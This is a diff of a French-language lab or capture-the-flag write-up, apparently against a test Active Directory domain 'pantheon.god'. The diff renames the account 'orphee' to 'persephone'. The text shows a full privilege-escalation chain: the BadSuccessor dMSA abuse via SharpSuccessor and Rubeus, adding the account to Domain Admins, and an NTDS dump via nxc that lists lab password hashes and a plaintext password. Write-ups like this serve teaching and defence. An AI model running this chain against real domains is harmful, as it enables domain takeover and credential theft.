@@ -756,15 +756,15 @@ Pour des raison que j’ignore elle ne peux pas êter exploiter directement sur 
 
 Le problème c’est qu’il va nous falloir une session `RDP` pour effectuer cette exploit. Mais nous n’avons pas le mdp de hades. 
 Le hash pourrait être utiliser pour ce connecter en RDP si il été administrateur local de la machine, ce qui n’est pas le cas. 
-Cependant ce dernier à un généricALL sur tout les objet de l’OU `ENFERS` dont `orphee` qui peut rdp sur la machine `pantheon-enfers.pantheon.god`.
+Cependant ce dernier à un généricALL sur tout les objet de l’OU `ENFERS` dont `persephone` qui peut rdp sur la machine `pantheon-enfers.pantheon.god`.
 
-On donne donc un genericALL sur une `OU` à orphee pour qu’il puisse exploiter `badsuccessor` à la place de hades.
+On donne donc un genericALL sur une `OU` à persephone pour qu’il puisse exploiter `badsuccessor` à la place de hades.
 
 ```bash
 hades@pantheon.god][Jun 26, 2025 - 02:38:28 (CEST)] exegol-pantheon_wu bloodhound # stobject "OU=ELYSEE,OU=ENFERS,DC=PANTHEON,DC=GOD"
 TargetObject set to 'OU=ENFERS,DC=PANTHEON,DC=GOD'
-[hades@pantheon.god][Jun 26, 2025 - 02:39:13 (CEST)] exegol-pantheon_wu bloodhound # stcontrolledprincipal orphee
-ControlledPrincipal set to 'orphee'
+[hades@pantheon.god][Jun 26, 2025 - 02:39:13 (CEST)] exegol-pantheon_wu bloodhound # stcontrolledprincipal persephone
+ControlledPrincipal set to 'persephone'
 ```
 
 ```bash
@@ -785,7 +785,7 @@ Il va nous falloire compiler le binaire `SharpSuccessor.exe` et `Rubeus.exe` dan
 Premièrement on va crée un un dMSA sur l’OU ENFERS sur la quel nous avons un droit `createChild`avec `SharpSuccessor.exe` 
 
 ```
-PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=ENFERS,DC=PANTHEON,DC=GOD" /account:orphee /name:pwned_dMSA
+PS C:\Users\hades\Desktop> .\SharpSuccessor.exe add /impersonate:Administrator /path:"OU=ENFERS,DC=PANTHEON,DC=GOD" /account:persephone /name:pwned_dMSA
    _____ _                      _____
   / ____| |                    / ____|
  | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
@@ -851,7 +851,7 @@ PS C:\Users\hades\Desktop> .\Rubeus.exe asktgs /targetuser:pwned_dMSA$ /service:
 [*] Action: Ask TGS
 
 [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
-[*] Building DMSA TGS-REQ request for 'pwned_dMSA$' from 'orphee'
+[*] Building DMSA TGS-REQ request for 'pwned_dMSA$' from 'persephone'
 [+] Sequence number is: 1951566350
 [*] Using domain controller: pantheon-dc01.pantheon.god (192.168.56.11)
 [+] TGS request successful!
@@ -876,7 +876,7 @@ PS C:\Users\hades\Desktop>
 ```
 
 ```
-PS C:\Users\hades\Desktop> net group "domain admins" /add orphee /domain
+PS C:\Users\hades\Desktop> net group "domain admins" /add persephone /domain
 The request will be processed at a domain controller for domain pantheon.god.
 
 The command completed successfully.
@@ -892,7 +892,7 @@ Cela nous permet de faire un `DCsync` pour récupérer tout les hash du domain
 nxc smb "192.168.56.11" -u "$USER" -p "$PASSWORD" --ntds
 [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n]
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
-SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\orphee:Mus1cM@st3r!2025 (admin)
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\persephone:Qu33n0fShad3s!2025 (admin)
 SMB         192.168.56.11   445    PANTHEON-DC01    [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         192.168.56.11   445    PANTHEON-DC01    Administrator:500:aad3b435b51404eeaad3b435b51404ee:aff6a388446bba49babad7aaf35aae83:::
 SMB         192.168.56.11   445    PANTHEON-DC01    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -915,7 +915,7 @@ SMB         192.168.56.11   445    PANTHEON-DC01    theseus:1125:aad3b435b51404e
 SMB         192.168.56.11   445    PANTHEON-DC01    perseus:1126:aad3b435b51404eeaad3b435b51404ee:48505186cb6ffaad4f14c52509b8438e:::
 SMB         192.168.56.11   445    PANTHEON-DC01    ulysse:1127:aad3b435b51404eeaad3b435b51404ee:36a6da7303d1a46aab641d44ba6990af:::
 SMB         192.168.56.11   445    PANTHEON-DC01    jason:1128:aad3b435b51404eeaad3b435b51404ee:b40f85d1bd20d52e721d9731753e5892:::
-SMB         192.168.56.11   445    PANTHEON-DC01    orphee:1129:aad3b435b51404eeaad3b435b51404ee:e5434e98bb7d29c8b4392bcca15d860a:::
+SMB         192.168.56.11   445    PANTHEON-DC01    persephone:1129:aad3b435b51404eeaad3b435b51404ee:e5434e98bb7d29c8b4392bcca15d860a:::
 SMB         192.168.56.11   445    PANTHEON-DC01    asclepios:1130:aad3b435b51404eeaad3b435b51404ee:e1ef927a14e399b67f532b5f492570a4:::
 SMB         192.168.56.11   445    PANTHEON-DC01    psyche:1131:aad3b435b51404eeaad3b435b51404ee:499dcff82f6d25be7b267a94c2cdb62e:::
 SMB         192.168.56.11   445    PANTHEON-DC01    ganymede:1132:aad3b435b51404eeaad3b435b51404ee:32e822f8b80fca89e0f70dfb9a6ffb47:::
@@ -935,5 +935,5 @@ SMB         192.168.56.11   445    PANTHEON-DC01    [+] Dumped 37 NTDS hashes to
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] To extract only enabled accounts from the output file, run the following command:
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] cat /root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds | grep -iv disabled | cut -d ':' -f1
 SMB         192.168.56.11   445    PANTHEON-DC01    [*] grep -iv disabled /root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds | cut -d ':' -f1
-[orphee@pantheon.god][Jun 26, 2025 - 07:10:37 (CEST)] exegol-pantheon_wu exploit #
+[persephone@pantheon.god][Jun 26, 2025 - 07:10:37 (CEST)] exegol-pantheon_wu exploit #
 ```
